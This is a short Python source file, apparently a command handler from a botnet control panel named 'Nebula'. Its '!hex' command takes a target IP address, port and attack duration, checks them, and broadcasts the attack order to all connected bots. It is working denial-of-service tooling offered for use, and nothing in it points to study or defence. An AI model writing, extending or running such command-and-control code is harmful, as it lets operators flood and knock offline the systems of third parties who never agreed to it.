from colorama import Fore

def hex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    send(client, f"{Fore.LIGHTWHITE_EX}Attack successfully sent to all {Fore.LIGHTBLACK_EX}Nebula {Fore.LIGHTWHITE_EX}servers!")
                    broadcast(data)
                else:
                    send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: !hex [IP] [PORT] [TIME]')